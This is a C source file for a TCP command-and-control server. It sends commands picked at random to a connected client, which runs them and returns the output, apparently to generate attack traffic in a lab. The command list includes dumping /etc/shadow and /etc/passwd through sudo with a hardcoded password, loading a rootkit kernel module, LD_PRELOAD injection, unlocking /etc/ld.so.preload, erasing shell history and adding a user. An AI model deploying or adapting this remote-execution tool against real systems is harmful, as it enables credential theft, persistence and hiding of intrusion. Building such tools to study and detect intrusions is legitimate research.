#include <stdio.h>
#include <string.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <errno.h>
#include <netinet/tcp.h>
#include <unistd.h>
#include "../stats/maths_and_stats.h"
#include <time.h>
#include <stdlib.h>

char *commands[69] = {
    "echo labcom | sudo -S arp", 
    "echo labcom | sudo -S arp -a", 
    "users", 
    //"netstat -plntu", 
    "netstat -i",
    "netstat -g",
    "netstat -M",
    "uname -a", "groups", 
    "tcpdump -n > output", 
    "LD_PRELOAD=\"/tmp/wqs.so\" /bin/ls", 
    "echo labcom | sudo -S insmod rootkit.ko", 
    "modprobe -r rootkit.ko", 
    "useradd –g 500 –u 500 –s /usr/local/bin/nocando –d /var/spool/vmail", 
    "mkdir teste", 
    "rm -r teste/", 
    "kill -9 12313123", 
    "lsmod | grep -i \"vboxsf\\|vboxguest\"", 
    "wget https://raw.githubusercontent.com/brnaguiar/linreg-c/main/linreg.py", 
    "chattr -i /etc/ld.so.preload",
    "echo labcom | sudo -S cat /etc/shadow > file",
    "echo labcom | sudo -S cat /etc/passwd > file",
    "echo "" > ~/.bash_history", 
    "ip a", 
    "ip route", 
    "ls", 
    "cd .", 
    "cd ..", 
    "cd ../../",
    "cd ../../../",
    "cd ../../../../",
    "cd ../../../../../../../../",
    "ls -l", 
    "ls -la", 
    "ls ../", 
    "ls ../../", 
    "ls ../../../", 
    "ls ../../../../", 
    "ls ../low/", 
    "ls ../../average-hacker/", 
    "ls ../../../../DNSExfil/", 
    "ls -l ../../average-hacker/", 
    "ls -l ../../../../DNSExfil/", 
    "ls ../../../../.vscode-server/", 
    "ls -l ../../../../.vscode-server/", 
    "cat ../../../../.zshrc", 
    "cat ~/.zshrc", "cat ~/.xsession-errors", 
    "cat ~/../../../../.xsession-errors", 
    "touch teste", 
    "rm teste", 
    "ps aux | grep client", 
    "chmod -x teste", 
    "echo \"asdasdasdad\"", 
//##"echo \"asdasdajdaskdaskdlakdsakdjasdkasdkalsjdaslkdjaslkdjaslkdajsdlkasjdaslkdjasldsakjdaksdjaslkdjasldkjasldkasjldaskjdlkasjdaslkdjalskdjsalkdasjldajdlkasjdsladjsalkdjaslkdjasldkajsldsajdlaskjdasldaslk\"", 
    "echo labcom | sudo -S ifconfig lo", 
    "ip a show lo",
    "netstat -s",
    "netstat -r",
    //"ss", 
    //"ss -ta",
    //"ss -ua", 
    //"ss -xa", 
    "echo \"asdasdasdasdasdasd asd asd asd asds dasdad\"", 
    "echo \"asdasdasdasdasdasdkasdas f fds f dsfsd fsdfsdfsdf sdfs dfsd fs fsd fs fds fsd fsd f sf ssdf sd fsd fsdf sdf \"",
    "echo \"asdkasdasmdsad asd as das das das d asd asd as das d sa das\"",
    "dig google.com", 
    "dig google.com MX", 
    "nslookup mindmajix.com",
    "echo  labcom | sudo -S route", 
    "iwconfig", 
    "curl -O google.com/doodles/childrens-day-2014-multiple-countries", 
    "whois fcporto.pt", 
    "whois ua.pt",
    "pwd"};


void *strrm(char *str, const char *substr)
{
    while(str = strstr(str, substr))
    {
        char *jump_substr = str+strlen(substr);
        memmove(str, jump_substr, strlen(jump_substr) + 1);
    }
}

int main(void)
{
    int serverfd, clientfd, client_size;
    struct sockaddr_in server_addr, client_addr;
    char server_message[100], client_message[2048];
    
    
    // Create socket:
    if((serverfd = socket(AF_INET, SOCK_STREAM, 0)) < 0)
    {
        printf("Error while creating socket: %s\n", strerror(errno));
        return -1;
    } printf("Socket created successfully\n"); int flag = 1;
    
    // reuse address 
    setsockopt(serverfd, SOL_SOCKET, SO_REUSEADDR, &flag, sizeof(flag));

    // Set port and IP:
    server_addr.sin_family = AF_INET;
    server_addr.sin_port = htons(64321);
    server_addr.sin_addr.s_addr = inet_addr("111.11.11.10"); // listen on any address
    
    // Bind to the set port and IP:
    if(bind(serverfd, (struct sockaddr*)&server_addr, sizeof(server_addr)) < 0)
    {
        printf("Couldn't bind to the port\n");
        return -1;
    } printf("Done with binding\n");
    
    // Listen for clients:
    if(listen(serverfd, 1) < 0)
    {
        printf("Error while listening\n");
        return -1;
    } printf("\nListening for incoming connections.....\n");
    
    // Accept an incoming connection:
    client_size = sizeof(client_addr);
    clientfd = accept(serverfd, (struct sockaddr*)&client_addr, &client_size);
    if (clientfd < 0)
    {
        printf("Can't accept\n");
        return -1;
    } printf("Client connected at IP: %s and port: %i\n", inet_ntoa(client_addr.sin_addr), ntohs(client_addr.sin_port));
    
    // disable Nagle's algorithm 
    setsockopt(clientfd, IPPROTO_TCP, TCP_NODELAY, (char *) &flag, sizeof(flag));
    setsockopt(serverfd, IPPROTO_TCP, TCP_NODELAY, (char *) &flag, sizeof(flag));

    // open client's socket file descriptor
    FILE *clientfd_file = fdopen(clientfd, "w+");

    while(1) 
    {

        // -------------------------- send commands to client  ----------------------------
        char buffer[2048];
        //printf("Message to send: "); 
        //fgets(buffer, 2048, stdin); 
        srand(time(NULL));
        int random_number = rand()%(sizeof(commands)/sizeof(commands[0])); // get random command;
        printf("\n random number: %d\n", random_number);  //dddd ppdd
        strcpy(buffer, commands[random_number]);
        int random_seconds = rand()%4; // get random seconds to wait to send commands...
        buffer[strcspn(buffer, "\r\n")] = 0;
        sleep(random_seconds);
        if (strlen(buffer) != 0)
        {
            strcat(buffer, " 2>&1"); size_t STDERR_SIZE = 5;
            strcat(buffer, "<STAIL>"); size_t TAIL_SIZE = 7;
            int str_len = 3+STDERR_SIZE+TAIL_SIZE+strlen(buffer)+1; buffer[str_len] = '\0';
            char outmsg[str_len]; sprintf(outmsg, "%03d", str_len);
            strcat(outmsg, buffer);
            setsockopt(clientfd, SOL_SOCKET, SO_SNDBUF, (int *)&str_len, sizeof(str_len));
            setsockopt(serverfd, SOL_SOCKET, SO_SNDBUF, (int *)&str_len, sizeof(str_len)); // better results if we set the two SO_SNDBUFs
            write(clientfd, outmsg, str_len);
            fflush(clientfd_file);

            // ---------------------- wait for the client's feedback ------------------------ 
            int endcmd = 0;
            printf("\n");
            while(!endcmd)
            {
                memset(client_message, '\0', sizeof(client_message));
                int client_message_size;
                if ((client_message_size = recv(clientfd, client_message, sizeof(client_message), 0)) < 0)
                {
                    printf("Couldn't receive\n");
                    return -1;
                }
                setsockopt(serverfd, IPPROTO_TCP, TCP_QUICKACK, (char *) &flag, sizeof(flag));

                if (client_message_size == 0)
                {
                    printf("Client has no more messages to send...");
                    return -1;
                }
                if (strstr(client_message, "<CTAIL>") != NULL)
                {
                    strrm(client_message, "<CTAIL>");
                    printf("%s", client_message);
                    endcmd = 1;
                } else printf("%s", client_message); //M//sg from client: Msg from client: 
            }
            printf("\n");
        } 
    }
    // Closing the socket:
    close(clientfd);
    close(serverfd);
    return 0;
}
